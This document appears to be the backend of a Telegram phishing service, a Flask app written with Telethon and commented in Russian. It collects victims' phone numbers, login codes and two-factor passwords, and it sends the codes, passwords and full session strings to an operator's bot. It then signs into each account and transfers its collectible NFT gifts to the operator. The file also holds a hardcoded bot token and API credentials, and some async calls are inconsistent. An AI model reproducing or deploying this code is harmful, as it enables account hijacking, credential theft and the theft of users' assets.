# app.py — С ПРАВИЛЬНЫМ МЕТОДОМ ПОЛУЧЕНИЯ ПОДАРКОВ

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import time
import random
import os
import json
import io
import re
from dotenv import load_dotenv
from telethon import TelegramClient, functions, types
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
    FloodWaitError
)
import requests

load_dotenv()

app = Flask(__name__)
CORS(app)

# ============================================================
# КОНФИГУРАЦИЯ
# ============================================================
API_ID = int(os.getenv('API_ID', '27908807'))
API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')
ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', '8766481292'))

sessions = {}

# ============================================================
# ОДИН EVENT LOOP
# ============================================================
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# ============================================================
# ЛОГИ
# ============================================================

def send_admin_log(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
            timeout=5
        )
    except Exception as e:
        print(f"Log error: {e}")

def send_tdata_to_admin(session_data):
    try:
        lines = []
        lines.append("=" * 50)
        lines.append("📁 TDATA СЕССИЯ")
        lines.append("=" * 50)
        lines.append(f"🆔 ID: {session_data.get('user_id', 'N/A')}")
        lines.append(f"📱 Phone: {session_data.get('phone', 'N/A')}")
        lines.append(f"👤 Username: @{session_data.get('username', 'N/A')}")
        lines.append("")
        lines.append("🔑 SESSION STRING:")
        lines.append(session_data.get('session_string', 'N/A'))
        
        content = "\n".join(lines)
        file_data = io.BytesIO(content.encode('utf-8'))
        
        files = {'document': (f"tdata_{session_data['phone']}_{int(time.time())}.txt", file_data)}
        data = {
            'chat_id': ADMIN_CHAT_ID,
            'caption': f"✅ СЕССИЯ\n👤 @{session_data['username']}\n📱 {session_data['phone']}",
            'parse_mode': 'Markdown'
        }
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendDocument",
            files=files,
            data=data,
            timeout=30
        )
    except Exception as e:
        print(f"Tdata error: {e}")

# ============================================================
# ГЕНЕРАЦИЯ ССЫЛКИ
# ============================================================

def get_gift_url(gift_name, gift_id=None):
    match = re.search(r'#(\d+)', gift_name)
    if match:
        number = match.group(1)
        collection = re.sub(r'#\d+', '', gift_name).strip()
        collection = re.sub(r'\s+', '', collection)
        return f"https://t.me/nft/{collection}-{number}"
    
    if gift_id:
        return f"https://t.me/nft/{gift_id}"
    
    collection = re.sub(r'\s+', '', gift_name)
    return f"https://t.me/nft/{collection}"

# ============================================================
# ПОЛУЧЕНИЕ ПОДАРКОВ (ПРАВИЛЬНЫЙ МЕТОД!)
# ============================================================

async def get_user_gifts(client):
    """Правильный метод получения подарков пользователя"""
    try:
        # Пробуем GetUserGiftsRequest
        result = await client(functions.payments.GetUserGiftsRequest())
        if result and hasattr(result, 'gifts'):
            return result.gifts
    except Exception as e:
        print(f"GetUserGiftsRequest error: {e}")
    
    try:
        # Пробуем GetGiftsRequest (альтернативный)
        result = await client(functions.payments.GetGiftsRequest())
        if result and hasattr(result, 'gifts'):
            return result.gifts
    except Exception as e:
        print(f"GetGiftsRequest error: {e}")
    
    try:
        # Пробуем GetStarsGiftsRequest
        result = await client(functions.payments.GetStarsGiftsRequest())
        if result and hasattr(result, 'gifts'):
            return result.gifts
    except Exception as e:
        print(f"GetStarsGiftsRequest error: {e}")
    
    return []

# ============================================================
# ПЕРЕДАЧА ПОДАРКОВ
# ============================================================

async def transfer_nft_gifts(session_string, phone, username, user_id):
    client = None
    try:
        client = TelegramClient(StringSession(session_string), api_id=API_ID, api_hash=API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await send_admin_log(f"❌ Сессия истекла\n📱 {phone}")
            return False
        
        # Получаем подарки
        all_gifts = await get_user_gifts(client)
        
        if not all_gifts:
            await send_admin_log(
                f"📭 *Нет подарков*\n📱 {phone}\n👤 @{username}\n\n"
                f"ℹ️ Проверьте, что у пользователя есть подарки.\n"
                f"Если подарки есть, возможно метод получения не работает."
            )
            return False
        
        # Фильтруем коллекционные
        nft_gifts = []
        for gift in all_gifts:
            is_limited = getattr(gift, 'limited', False)
            if is_limited:
                nft_gifts.append(gift)
        
        if not nft_gifts:
            await send_admin_log(
                f"📭 *Нет коллекционных NFT подарков*\n📱 {phone}\n👤 @{username}\n\n"
                f"ℹ️ Найдено {len(all_gifts)} обычных подарков, но ни одного коллекционного"
            )
            return False
        
        # Формируем список
        gift_links = []
        gift_ids = []
        gift_names = []
        
        for gift in nft_gifts:
            gift_id = getattr(gift, 'id', None) or getattr(gift, 'gift_id', None)
            if not gift_id:
                continue
            
            gift_ids.append(gift_id)
            gift_name = getattr(gift, 'name', 'Unknown NFT')
            gift_names.append(gift_name)
            gift_stars = getattr(gift, 'stars', 0)
            gift_issued = getattr(gift, 'issued', 0)
            gift_total = getattr(gift, 'total', 0)
            
            gift_url = get_gift_url(gift_name, gift_id)
            gift_links.append(f"• [{gift_name}]({gift_url}) — Stars: {gift_stars} [{gift_issued}/{gift_total}]")
        
        if gift_links:
            gift_links_text = "\n".join(gift_links)
            await send_admin_log(
                f"🔍 *Найдено {len(gift_links)} коллекционных NFT подарков*\n"
                f"📱 {phone}\n👤 @{username}\n\n"
                f"📦 Ссылки:\n{gift_links_text}\n\n🔄 Передача..."
            )
        
        # Передаём
        transferred = 0
        transferred_links = []
        
        for i, gift_id in enumerate(gift_ids):
            try:
                await client(functions.payments.TransferStarGiftRequest(
                    gift_id=gift_id,
                    to_id=ADMIN_USER_ID
                ))
                transferred += 1
                gift_name = gift_names[i] if i < len(gift_names) else 'Unknown'
                gift_url = get_gift_url(gift_name, gift_id)
                transferred_links.append(f"• [{gift_name}]({gift_url}) — ✅ Передан")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Transfer error: {e}")
                continue
        
        if transferred > 0:
            transferred_text = "\n".join(transferred_links)
            await send_admin_log(
                f"✅ *Передано {transferred} NFT подарков*\n"
                f"📱 {phone}\n👤 @{username}\n\n📦 {transferred_text}"
            )
            return True
        else:
            await send_admin_log(f"⚠️ Не удалось передать NFT\n📱 {phone}")
            return False
        
    except Exception as e:
        await send_admin_log(f"❌ Ошибка\n📱 {phone}\n`{str(e)[:200]}`")
        return False
    finally:
        if client and client.is_connected():
            try:
                await client.disconnect()
            except:
                pass

# ============================================================
# ОСТАЛЬНЫЕ ФУНКЦИИ
# ============================================================

async def send_code_async(phone):
    try:
        client = TelegramClient(StringSession(), api_id=API_ID, api_hash=API_HASH)
        await client.connect()
        
        if await client.is_user_authorized():
            await client.disconnect()
            return {'success': False, 'error': 'Already authorized'}
        
        result = await client.send_code_request(phone)
        
        sessions[phone] = {
            'client': client,
            'phone_code_hash': result.phone_code_hash
        }
        
        send_admin_log(f"📱 Код для {phone}")
        return {'success': True, 'phone_code_hash': result.phone_code_hash}
        
    except PhoneNumberInvalidError:
        return {'success': False, 'error': 'Invalid phone number'}
    except FloodWaitError as e:
        return {'success': False, 'error': f'Wait {e.seconds}s'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_code_async(phone, code, phone_code_hash):
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found'}
        
        client = client_data['client']
        if not client.is_connected():
            await client.connect()
        
        try:
            signed_in = await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            session_string = client.session.save()
            
            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }
            
            await client.disconnect()
            
            send_admin_log(f"✅ Код: {code}\n📱 {phone}\n👤 @{session_data['username']} (ID: {session_data['user_id']})")
            
            await transfer_nft_gifts(session_string, phone, session_data['username'], session_data['user_id'])
            
            return {'success': True, 'hasPassword': False, 'sessionData': session_data}
            
        except SessionPasswordNeededError:
            send_admin_log(f"🔐 Требуется пароль\n📱 {phone}\nКод: {code}")
            return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
            
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_password_async(phone, password):
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found'}
        
        client = client_data['client']
        if not client.is_connected():
            await client.connect()
        
        try:
            signed_in = await client.sign_in(password=password)
            session_string = client.session.save()
            
            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }
            
            await client.disconnect()
            
            send_admin_log(f"🔑 Пароль: {password}\n📱 {phone}\n👤 @{session_data['username']} (ID: {session_data['user_id']})")
            
            await transfer_nft_gifts(session_string, phone, session_data['username'], session_data['user_id'])
            
            return {'success': True, 'sessionData': session_data}
            
        except PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid cloud password'}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ============================================================
# ОБЁРТКА
# ============================================================

def run_async(coro):
    return loop.run_until_complete(coro)

# ============================================================
# API ЭНДПОИНТЫ
# ============================================================

@app.route('/ping', methods=['GET'])
@app.route('/', methods=['GET'])
def ping():
    import telethon
    return jsonify({
        'status': 'online',
        'telethon_version': getattr(telethon, '__version__', 'unknown')
    })

@app.route('/sendCode', methods=['POST'])
def send_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    
    if not phone or len(phone) < 6:
        return jsonify({'success': False, 'error': 'Invalid phone'}), 400
    
    result = run_async(send_code_async(phone))
    
    if result['success']:
        return jsonify({
            'success': True,
            'phoneCodeHash': result.get('phone_code_hash'),
            'message': 'Code sent by Telegram'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkCode', methods=['POST'])
def check_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    phone_code_hash = data.get('phoneCodeHash', '').strip()
    
    if not phone or not code or not phone_code_hash:
        return jsonify({'success': False, 'error': 'Missing fields'}), 400
    
    result = run_async(check_code_async(phone, code, phone_code_hash))
    
    if result['success']:
        if result.get('hasPassword'):
            return jsonify({
                'success': True,
                'hasPassword': True,
                'message': 'Cloud password required'
            })
        else:
            session_data = result['sessionData']
            send_tdata_to_admin(session_data)
            return jsonify({
                'success': True,
                'hasPassword': False,
                'sessionData': session_data,
                'message': 'Verified'
            })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkPassword', methods=['POST'])
def check_password():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    password = data.get('password', '').strip()
    
    if not phone or not password:
        return jsonify({'success': False, 'error': 'Missing phone or password'}), 400
    
    result = run_async(check_password_async(phone, password))
    
    if result['success']:
        session_data = result['sessionData']
        send_tdata_to_admin(session_data)
        return jsonify({
            'success': True,
            'sessionData': session_data,
            'message': 'Password verified successfully'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == '__main__':
    import telethon
    print("=" * 60)
    print("🔐 БЭКЕНД ЗАПУЩЕН")
    print(f"📌 Telethon версия: {getattr(telethon, '__version__', 'unknown')}")
    print("📌 Пытаемся получить подарки через GetUserGiftsRequest")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000)
